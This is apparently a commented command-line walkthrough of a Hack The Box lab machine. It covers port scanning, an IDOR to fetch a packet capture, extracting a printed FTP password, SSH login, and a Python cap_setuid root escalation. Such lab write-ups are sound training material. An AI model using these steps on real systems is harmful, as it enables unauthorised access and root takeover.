
# Test connectivity to the target machine
ping -c 3 10.129.9.76

# ─────────────────────────────────────────
# RECONNAISSANCE — NMAP
# ─────────────────────────────────────────

# Step 1: Fast scan of ALL 65,535 ports
# -p-          → scan every port
# --min-rate   → send at least 10,000 packets/sec for speed
# -Pn          → skip ping check (HTB machines block ICMP)
nmap -p- --min-rate 10000 -Pn 10.129.9.76

# Step 2: Deep scan of discovered open ports
# -sC  → run default NSE scripts (grab banners, check vulns)
# -sV  → detect exact service versions
# -Pn  → skip ping again
nmap -sCV -p 21,22,80 -Pn 10.129.9.76

# ─────────────────────────────────────────
# WEB ENUMERATION — IDOR
# ─────────────────────────────────────────

# Visit the web app in browser, click Security Snapshot
# URL becomes: http://10.129.9.76/data/1
# Manually change 1 → 0 to exploit IDOR:
# http://10.129.9.76/data/0
# Download the PCAP file from that page

# ─────────────────────────────────────────
# PCAP ANALYSIS
# ─────────────────────────────────────────

# Open PCAP in Wireshark GUI
wireshark 0.pcap

# OR extract credentials directly from terminal
# strings  → prints readable text from binary file
# grep -i  → case-insensitive search for "pass"
strings 0.pcap | grep -i pass

# In Wireshark: type 'ftp' in the filter bar
# Look for lines: USER nathan / PASS Buck3tH4TF0RM3!

# ─────────────────────────────────────────
# INITIAL ACCESS — SSH
# ─────────────────────────────────────────

# Login via SSH using credentials found in PCAP
ssh nathan@10.129.9.76
# Password: Buck3tH4TF0RM3!

# Grab the user flag (HTB convention: always at ~/user.txt)
cat ~/user.txt

# ─────────────────────────────────────────
# PRIVILEGE ESCALATION — LINUX CAPABILITIES
# ─────────────────────────────────────────

# Find binaries with special Linux capabilities
# getcap    → get file capabilities
# -r /      → search recursively from root
# 2>/dev/null → suppress permission denied errors
getcap -r / 2>/dev/null
# Output: /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

# Exploit cap_setuid on Python to get a root shell
# os.setuid(0)        → change process UID to root (0)
# os.system("/bin/bash") → spawn bash as root
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Confirm you are root
whoami
# Output: root

# Grab the root flag
cat /root/root.txt